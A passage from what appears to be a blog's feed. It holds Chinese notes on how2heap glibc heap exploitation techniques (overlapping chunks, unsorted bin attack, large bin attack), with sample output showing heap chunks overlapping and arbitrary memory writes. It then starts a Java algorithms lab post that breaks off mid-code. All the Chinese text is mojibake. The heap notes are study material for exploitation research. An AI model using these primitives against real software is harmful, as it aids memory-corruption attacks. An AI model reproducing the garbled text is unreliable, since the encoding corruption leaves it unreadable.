é—®é¢˜ï¼Œé¦–å…ˆç”³è¯· 3 ä¸ª chunk<br>è¿™ä¸‰ä¸ª chunk åˆ†åˆ«ç”³è¯·åˆ°äº†:<br>p1ï¼š0x2088010<br>p2ï¼š0x2088110<br>p3ï¼š0x2088210<br>ç»™ä»–ä»¬åˆ†åˆ«å¡«å……<span class="hljs-string">"1"</span><span class="hljs-string">"2"</span><span class="hljs-string">"3"</span><br><br>free æ‰ p2<br>p2 è¢«æ”¾åˆ° unsorted bin ä¸­<br>ç°åœ¨å‡è®¾æœ‰ä¸€ä¸ªå †æº¢å‡ºæ¼æ´ï¼Œå¯ä»¥è¦†ç›– p2<br>ä¸ºäº†ä¿è¯å †å—ç¨³å®šæ€§ï¼Œæˆ‘ä»¬è‡³å°‘éœ€è¦è®© prev_inuse ä¸º 1ï¼Œç¡®ä¿ p1 ä¸ä¼šè¢«è®¤ä¸ºæ˜¯ç©ºé—²çš„å †å—<br>æˆ‘ä»¬å°† p2 çš„å¤§å°è®¾ç½®ä¸º 385, è¿™æ ·çš„è¯æˆ‘ä»¬å°±èƒ½ç”¨ 376 å¤§å°çš„ç©ºé—´<br><br>ç°åœ¨è®©æˆ‘ä»¬åˆ†é…å¦ä¸€ä¸ªå—ï¼Œå…¶å¤§å°ç­‰äºå—p2æ³¨å…¥å¤§å°çš„æ•°æ®å¤§å°<br>malloc å°†ä¼šæŠŠå‰é¢ free çš„ p2 åˆ†é…ç»™æˆ‘ä»¬ï¼ˆp2 çš„ size å·²ç»è¢«æ”¹æ‰äº†ï¼‰<br><br>p4 åˆ†é…åœ¨ 0x2088110 åˆ° 0x2088288 è¿™ä¸€åŒºåŸŸ<br>p3 ä» 0x2088210 åˆ° 0x2088288<br>p4 åº”è¯¥ä¸ p3 é‡å ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ p4 åŒ…æ‹¬æ‰€æœ‰ p3<br>è¿™æ—¶å€™é€šè¿‡ç¼–è¾‘ p4 å°±å¯ä»¥ä¿®æ”¹ p3 çš„å†…å®¹ï¼Œä¿®æ”¹ p3 ä¹Ÿå¯ä»¥ä¿®æ”¹ p4 çš„å†…å®¹<br><br>æ¥ä¸‹æ¥éªŒè¯ä¸€ä¸‹ï¼Œç°åœ¨ p3 ä¸ p4:<br>p4 = 22222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222<br>p3 = 3333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333ï¿½<br><br>å¦‚æœæˆ‘ä»¬ä½¿ç”¨ memset(p4, '4', 376), å°†ä¼š:<br>p4 = 44444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444ï¿½<br>p3 = 4444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444ï¿½<br><br></code></pre></td></tr></tbody></table></figure><p><strong>æ“ä½œ</strong></p><ul><li>ç”³è¯·ä¸‰ä¸ªå †å—å¤§å°ä¸º0xf8ï¼Œ0xf8ï¼Œ0x78</li><li>free p2ï¼Œp2è¢«æ”¾åˆ° unsorted bin ä¸­</li><li>å‡è®¾å­˜åœ¨ä¸€ä¸ªå †æº¢å‡ºæ¼æ´ï¼Œå¯ä»¥è¦†ç›–p2</li></ul><p><strong>ç»“æœ</strong></p><p>å †å—é‡å </p><h2 id="Overlapping-chunks-2"><a href="#Overlapping-chunks-2" class="headerlink" title="Overlapping_chunks_2"></a>Overlapping_chunks_2</h2><p><strong>åŸç†</strong></p><p><strong>æ“ä½œ</strong></p><p><strong>ç»“æœ</strong></p><h2 id="Mmap-overlapping-chunks"><a href="#Mmap-overlapping-chunks" class="headerlink" title="Mmap_overlapping_chunks"></a>Mmap_overlapping_chunks</h2><p><strong>åŸç†</strong></p><p><strong>æ“ä½œ</strong></p><p><strong>ç»“æœ</strong></p><h2 id="Unsorted-bin-attack"><a href="#Unsorted-bin-attack" class="headerlink" title="Unsorted_bin_attack"></a>Unsorted_bin_attack</h2><p><strong>åŸç†</strong></p><figure class="highlight mipsasm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">unsorted <span class="hljs-keyword">bin </span>attack å®ç°äº†æŠŠä¸€ä¸ªè¶…çº§å¤§çš„æ•°ï¼ˆunsorted <span class="hljs-keyword">bin </span>çš„åœ°å€ï¼‰å†™åˆ°ä¸€ä¸ªåœ°æ–¹<br>å®é™…ä¸Šè¿™ç§æ”»å‡»æ–¹æ³•å¸¸å¸¸ç”¨æ¥ä¿®æ”¹ global_max_fast æ¥ä¸ºè¿›ä¸€æ­¥çš„ fastbin attack åšå‡†å¤‡<br><br>æˆ‘ä»¬å‡†å¤‡æŠŠè¿™ä¸ªåœ°æ–¹ <span class="hljs-number">0x7ffe5b09ba18</span> çš„å€¼ <span class="hljs-number">0</span> æ›´æ”¹ä¸ºä¸€ä¸ªå¾ˆå¤§çš„æ•°<br><br>ä¸€å¼€å§‹å…ˆç”³è¯·ä¸€ä¸ªæ¯”è¾ƒæ­£å¸¸çš„ chunk: <span class="hljs-number">0x14fe010</span><br>å†åˆ†é…ä¸€ä¸ªé¿å…ä¸ top chunk åˆå¹¶<br><br>å½“æˆ‘ä»¬é‡Šæ”¾æ‰ç¬¬ä¸€ä¸ª chunk ä¹‹åä»–ä¼šè¢«æ”¾åˆ° unsorted <span class="hljs-keyword">bin </span>ä¸­ï¼ŒåŒæ—¶å®ƒçš„ <span class="hljs-keyword">bk </span>æŒ‡é’ˆä¸º <span class="hljs-number">0x7efe12f93b78</span><br>ç°åœ¨å‡è®¾æœ‰ä¸ªæ¼æ´ï¼Œå¯ä»¥è®©æˆ‘ä»¬ä¿®æ”¹ free äº†çš„ chunk çš„ <span class="hljs-keyword">bk </span>æŒ‡é’ˆ<br>æˆ‘ä»¬æŠŠç›®æ ‡åœ°å€ï¼ˆæƒ³è¦æ”¹ä¸ºè¶…å¤§å€¼çš„é‚£ä¸ªåœ°æ–¹ï¼‰å‡å» <span class="hljs-number">0x10</span> å†™åˆ° <span class="hljs-keyword">bk </span>æŒ‡é’ˆ:<span class="hljs-number">0x7ffe5b09ba08</span><br><br>å†å» malloc çš„æ—¶å€™å¯ä»¥å‘ç°é‚£é‡Œçš„å€¼å·²ç»æ”¹å˜ä¸º unsorted <span class="hljs-keyword">bin </span>çš„åœ°å€<br><span class="hljs-number">0x7ffe5b09ba18</span>: <span class="hljs-number">0x7efe12f93b78</span><br><br></code></pre></td></tr></tbody></table></figure><p><strong>æ“ä½œ</strong></p><ul><li>ç”³è¯·ä¸€ä¸ªchunk p1 (0x410)ï¼Œå†ç”³è¯·ä¸€ä¸ªchunk p2é¿å…ä¸top chunk åˆå¹¶</li><li>free p1ï¼Œp1ä¼šè¢«æ”¾å…¥ unsorted bin ä¸­ï¼ŒåŒæ—¶fd å’Œ bkæŒ‡é’ˆä¸ºmain_arena_88</li><li>å‡è®¾æœ‰ä¸ªæ¼æ´ï¼Œå¯ä»¥ä¿®æ”¹p1çš„bkæŒ‡é’ˆ</li><li>ä¿®æ”¹ bk -&gt; (goal - 0x10)</li><li>å†mallocç›¸åŒå¤§å°çš„chunk pï¼Œgoalå·²ç»ä¸ºunsorted bin çš„åœ°å€</li></ul><p><strong>ç»“æœ</strong></p><p>ä¿®æ”¹ä»»æ„ä½ç½®ä¸º ä¸€ä¸ªå¾ˆå¤§çš„æ•°</p><h2 id="Large-bin-attack"><a href="#Large-bin-attack" class="headerlink" title="Large_bin_attack"></a>Large_bin_attack</h2><p><strong>åŸç†</strong></p><figure class="highlight x86asm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">è·Ÿ unsorted bin attack å®ç°çš„åŠŸèƒ½å·®ä¸å¤šï¼Œéƒ½æ˜¯æŠŠä¸€ä¸ªåœ°å€çš„å€¼æ”¹ä¸ºä¸€ä¸ªå¾ˆå¤§çš„æ•°<br><br>å…ˆæ¥çœ‹ä¸€ä¸‹ç›®æ ‡:<br>stack_var1 (<span class="hljs-number">0x7fff83c2e410</span>): <span class="hljs-number">0</span><br>stack_var2 (<span class="hljs-number">0x7fff83c2e418</span>): <span class="hljs-number">0</span><br><br>åˆ†é…ç¬¬ä¸€ä¸ª large chunk: <span class="hljs-number">0x6ac000</span><br>å†åˆ†é…ä¸€ä¸ª fastbin å¤§å°çš„ chunkï¼Œæ¥é¿å… free çš„æ—¶å€™ä¸‹ä¸€ä¸ª large chunk ä¸ç¬¬ä¸€ä¸ªåˆå¹¶äº†<br><br>ç”³è¯·ç¬¬äºŒä¸ª large chunk åœ¨: <span class="hljs-number">0x6ac360</span><br>åŒæ ·åœ¨åˆ†é…ä¸€ä¸ª fastbin å¤§å°çš„ chunk é˜²æ­¢åˆå¹¶æ‰<br><br>æœ€åç”³è¯·ç¬¬ä¸‰ä¸ª large chunk åœ¨: <span class="hljs-number">0x6ac7a0</span><br>ç”³è¯·ä¸€ä¸ª fastbin å¤§å°çš„é˜²æ­¢ free çš„æ—¶å€™ç¬¬ä¸‰ä¸ª large chunk ä¸ top chunk åˆå¹¶<br><br>free æ‰ç¬¬ä¸€ä¸ªå’Œç¬¬äºŒä¸ª chunkï¼Œä»–ä»¬ä¼šè¢«æ”¾åœ¨ unsorted bin ä¸­ [ <span class="hljs-number">0x6ac360</span> &lt;--&gt; <span class="hljs-number">0x6ac000</span> ]<br><br>ç°åœ¨å»ç”³è¯·ä¸€ä¸ªæ¯”ä»–ä¿©å°çš„ï¼Œç„¶åä¼šæŠŠç¬¬ä¸€ä¸ªåˆ†å‰²å‡ºæ¥ï¼Œç¬¬äºŒä¸ªåˆ™è¢«æ•´ç†åˆ° largebin ä¸­ï¼Œç¬¬ä¸€ä¸ªå‰©ä¸‹çš„ä¼šæ”¾å›åˆ° unsortedbin ä¸­ [ <span class="hljs-number">0x6ac0a0</span> ]<br><br>free æ‰ç¬¬ä¸‰ä¸ªï¼Œä»–ä¼šè¢«æ”¾åˆ° unsorted bin ä¸­: [ <span class="hljs-number">0x6ac7a0</span> &lt;--&gt; <span class="hljs-number">0x6ac0a0</span> ]<br><br>å‡è®¾æœ‰ä¸ªæ¼æ´ï¼Œå¯ä»¥è¦†ç›–æ‰ç¬¬äºŒä¸ª chunk çš„ <span class="hljs-string">"size"</span> ä»¥åŠ <span class="hljs-string">"bk"</span>ã€<span class="hljs-string">"bk_nextsize"</span> æŒ‡é’ˆ<br>å‡å°‘é‡Šæ”¾çš„ç¬¬äºŒä¸ª chunk çš„å¤§å°å¼ºåˆ¶ malloc æŠŠå°†è¦é‡Šæ”¾çš„ç¬¬ä¸‰ä¸ª large chunk æ’å…¥åˆ° largebin åˆ—è¡¨çš„å¤´éƒ¨ï¼ˆlargebin ä¼šæŒ‰ç…§å¤§å°æ’åºï¼‰ã€‚è¦†ç›–æ‰æ ˆå˜é‡ã€‚è¦†ç›– bk ä¸º stack_var1-<span class="hljs-number">0x10</span>ï¼Œbk_nextsize ä¸º stack_var2-<span class="hljs-number">0x20</span><br><br>å†æ¬¡ mallocï¼Œä¼šæŠŠé‡Šæ”¾çš„ç¬¬ä¸‰ä¸ª chunk æ’å…¥åˆ° largebin ä¸­ï¼ŒåŒæ—¶æˆ‘ä»¬çš„ç›®æ ‡å·²ç»æ”¹å†™äº†:<br>stack_var1 (<span class="hljs-number">0x7fff83c2e410</span>): <span class="hljs-number">0x6ac7a0</span><br>stack_var2 (<span class="hljs-number">0x7fff83c2e418</span>): <span class="hljs-number">0x6ac7a0</span><br><br></code></pre></td></tr></tbody></table></figure><p><strong>æ“ä½œ</strong></p><ul><li>åˆ†é…ç¬¬ä¸€ä¸ªlarge bin chunkï¼Œå†ç”³è¯·ä¸€ä¸ªfast bin chunk éš”ç»ï¼Œé¿å…å’Œä¸‹ä¸€ä¸ªlarge bin chunkåˆå¹¶</li><li>åˆ†é…ç¬¬äºŒä¸ªlarge bin chunkï¼Œå†ç”³è¯·ä¸€ä¸ªfast bin chunk éš”ç»ï¼Œé¿å…å’Œä¸‹ä¸€ä¸ªlarge bin chunkåˆå¹¶</li><li>åˆ†é…ç¬¬ä¸‰ä¸ªlarge bin chunkï¼Œå†ç”³è¯·ä¸€ä¸ªfast bin chunk éš”ç»ï¼Œé¿å…å’Œä¸‹ä¸€ä¸ªlarge bin chunkåˆå¹¶</li><li>free chunk1 å’Œ chunk2  å‡è¢«æ”¾å…¥unsorted bin ä¸­</li><li>ç°åœ¨å»ç”³è¯·ä¸€ä¸ªæ¯”ä»–ä¿©å°çš„ï¼Œç„¶åä¼šæŠŠç¬¬ä¸€ä¸ªåˆ†å‰²å‡ºæ¥ï¼Œç¬¬äºŒä¸ªåˆ™è¢«æ•´ç†åˆ° largebin ä¸­ï¼Œç¬¬ä¸€ä¸ªå‰©ä¸‹çš„ä¼šæ”¾å›åˆ° unsortedbin ä¸­</li><li>free chunk3 æ”¾åˆ°unsorted bin ä¸­</li><li>å­˜åœ¨æ¼æ´ï¼Œå¯ä»¥è¦†ç›–æ‰ç¬¬äºŒä¸ªchunk çš„size bk bk_nextsize</li><li>å‡å°‘é‡Šæ”¾çš„ç¬¬äºŒä¸ª chunk çš„å¤§å°å¼ºåˆ¶ malloc æŠŠå°†è¦é‡Šæ”¾çš„ç¬¬ä¸‰ä¸ª large chunk æ’å…¥åˆ° largebin åˆ—è¡¨çš„å¤´éƒ¨ï¼ˆlargebin ä¼šæŒ‰ç…§å¤§å°æ’åºï¼‰ã€‚è¦†ç›–æ‰æ ˆå˜é‡ã€‚è¦†ç›– bk ä¸º stack_var1-0x1</li><li>å†æ¬¡ mallocï¼Œä¼šæŠŠé‡Šæ”¾çš„ç¬¬ä¸‰ä¸ª chunk æ’å…¥åˆ° largebin ä¸­ï¼ŒåŒæ—¶æˆ‘ä»¬çš„ç›®æ ‡å·²ç»æ”¹å†™äº†</li></ul><p><strong>ç»“æœ</strong></p><p>â€‹æ ˆä¸Šåœ°å€è¢«è¦†ç›–</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;First-fit&quot;&gt;&lt;a href=&quot;#First-fit&quot; class=&quot;headerlink&quot; title=&quot;First fit&quot;&gt;&lt;/a&gt;First fit&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;åŸç†&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;hig</summary>
      
    
    
    
    <category term="heap" scheme="https://kylinxin.github.io/categories/heap/"/>
    
    
    <category term="how2heap" scheme="https://kylinxin.github.io/tags/how2heap/"/>
    
  </entry>
  
  <entry>
    <title>ç®—æ³•ä¸ç¨‹åºè®¾è®¡å®éªŒ</title>
    <link href="https://kylinxin.github.io/2023/10/31/%E7%AE%97%E6%B3%95%E4%B8%8E%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E5%AE%9E%E9%AA%8C/"/>
    <id>https://kylinxin.github.io/2023/10/31/%E7%AE%97%E6%B3%95%E4%B8%8E%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E5%AE%9E%E9%AA%8C/</id>
    <published>2023-10-31T15:14:29.000Z</published>
    <updated>2023-11-13T07:35:00.272Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ç®—æ³•ä¸ç¨‹åºè®¾è®¡å®éªŒ"><a href="#ç®—æ³•ä¸ç¨‹åºè®¾è®¡å®éªŒ" class="headerlink" title="ç®—æ³•ä¸ç¨‹åºè®¾è®¡å®éªŒ"></a>ç®—æ³•ä¸ç¨‹åºè®¾è®¡å®éªŒ</h1><p>è¦æ±‚</p><blockquote><p>1.å¤ç°ä»£ç ï¼Œå†™ä¸Šè‡ªå·±çš„æ³¨é‡Š</p><p>2.ç»“æœå±•ç¤º</p><p>3.å°†ä»£ç è¿›è¡Œä¿®æ”¹ï¼Œbugä¿®æ”¹ï¼Œå†…å®¹æå‡</p></blockquote><h2 id="ç¬¬äºŒç« "><a href="#ç¬¬äºŒç« " class="headerlink" title="ç¬¬äºŒç« "></a>ç¬¬äºŒç« </h2><h3 id="é€†åºè®¡æ•°"><a href="#é€†åºè®¡æ•°" class="headerlink" title="é€†åºè®¡æ•°"></a>é€†åºè®¡æ•°</h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.util.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Countlnversions</span> {<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span><br>    {<br>        System.out.println(<span class="hljs-string">"è¯·è¾“å…¥å¾…è®¡æ•°é€†åºçš„æ•´æ•°åºåˆ—(ä»¥ç©ºæ ¼åˆ†å¼€ï¼Œå„é¡¹å€¼éƒ½ä¸åŒ)"</span>);<br>        Scanner in=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br>        String line=in.nextLine();<br>        String[] tokens=line.split(<span class="hljs-string">" "</span>);<br>        <span class="hljs-comment">//è·å–ç”¨æˆ·è¾“å…¥çš„åºåˆ—</span><br>        <span class="hljs-type">int</span>[] S1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[tokens.length];<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;tokens.length;i++)<br>            S1[i]=Integer.parseInt(tokens[i]);<br>        <span class="hljs-type">int</span> count=sortAndCount(S1);<br>        <span class="hljs-comment">//è°ƒç”¨å®ç°SACç®—æ³•çš„æ–¹æ³•ï¼Œè¿”å›è®¡æ•°ç»“æœ</span><br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;S1.length;i++)<br>            System.out.print(S1[i]+<span class="hljs-string">" "</span>);<br>        System.out.print(<span class="hljs-string">"\né€†åºè®¡æ•°ä¸ºï¼š"</span>+count);<br>        <span class="hljs-comment">//æ˜¾ç¤ºæ’åºåçš„åºåˆ—å’Œé€†åºè®¡æ•°å€¼</span><br>    }<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sortAndCount</span><span class="hljs-params">(<span class="hljs-type">int</span>[]S)</span>{<br>        <span class="hljs-keyword">if</span>(S.length==<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> n=S.length/<span class="hljs-number">2</span>;<br>        <span class="hljs-type">int</span>[] A=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[n];<br>        <span class="hljs-type">int</span>[] B=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[S.length-n];<br>        <span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;A.length;i++)<br>            A[i]=S[j++];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;B.length;i++)<br>            B[i]=S[j++];<br>        <span class="hljs-type">int</span> rA=sortAndCount(A);<br>        <span class="hljs-type">int</span> rB=sortAndCount(B);<br>        <span class="hljs-type">int</span> r=mergeAndCount(A,B,S);<br>        <span class="hljs-keyword">return</span> (r+rA+rB);<br>    }<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">mergeAndCount</span><span class="hljs-params">(<span class="hljs-type">int</span>[]A,<span class="hljs-type">int</span>[]B,<span class="hljs-type">int</span>[]C)</span><br>    {<br>        <span class="hljs-type">int</span> i=<span class="hljs-number">0</span>,j=<span class="hljs-number">0</span>,k=<span class="hljs-number">0</span>,count=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> (i&lt;A.length&amp;&amp;j&lt;B.length)<br>        {<br>            <span class="hljs-keyword">if</span> (A[i]&gt;B[j])<br>            {<br>                count+=A.length-i;<br>                C[k++]=B[j++];<br>            }<br>            <span class="hljs-keyword">else</span> {<br>                C[k++]=A[i++];<br>            }<br>        }<br>        <span class="hljs-keyword">if</span> (i==A.length&amp;&amp;j&lt; B.length)<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> l=j;l&lt; B.length;l++)<br>                C[k++]=B[l];<br>        <span class="hljs-keyword">if</span> (i&lt; A.length&amp;&amp;j== B.length)<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> l=i;l&lt; A.length;l++)<br>                C[k++]=A[l];<br>        <span class="hljs-keyword">return</span> count;<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><h3 id="å¯»æ‰¾æœ€è¿‘ç‚¹å¯¹"><a href="#å¯»æ‰¾æœ€è¿‘ç‚¹å¯¹" class="headerlink" title="å¯»æ‰¾æœ€è¿‘ç‚¹å¯¹"></a>å¯»æ‰¾æœ€è¿‘ç‚¹å¯¹</h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Arrays;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FindClosestPair</span> {<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {<br>        <span class="hljs-type">int</span> N=<span class="hljs-number">30</span>;<br>        <span class="hljs-type">int</span> beishu=<span class="hljs-number">5000</span>;<br>        <span class="hljs-type">int</span>[] x=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[N];<br>        <span class="hljs-type">int</span>[] y=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[N];<br>        <span class="hljs-type">int</span>[] p2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">4</span>];<br>        <span class="hljs-type">int</span>[] x2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[N];<br>        <span class="hljs-type">int</span>[] y2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[N];<br>        StdDraw.setXscale(<span class="hljs-number">0</span>, beishu);<br>        StdDraw.setYscale(<span class="hljs-number">0</span>, beishu);<br>        StdDraw.setPenRadius(<span class="hljs-number">0.005</span>);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;N;i++){<br>            x[i]=(<span class="hljs-type">int</span>)(Math.random()*beishu);<br>            y[i]=(<span class="hljs-type">int</span>)(Math.random()*beishu);<br>            x2[i]=x[i];<br>            y2[i]=y[i];<br>        }<br>        <span class="hljs-type">int</span>[][] pX=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">2</span>][N];<br>        <span class="hljs-type">int</span>[][] pY=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">2</span>][N];<br>        <span class="hljs-type">int</span>[] flagX=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[N];<br>        <span class="hljs-type">int</span>[] flagY=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[N];<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;N;i++){<br>            StdDraw.point(x[i], y[i]);<br>            flagX[i]=<span class="hljs-number">1</span>;<br>            flagY[i]=<span class="hljs-number">1</span>;<br>        }<br>        Arrays.sort(x);<br>        Arrays.sort(y);<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;N;i++){<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;N;j++){<br>                <span 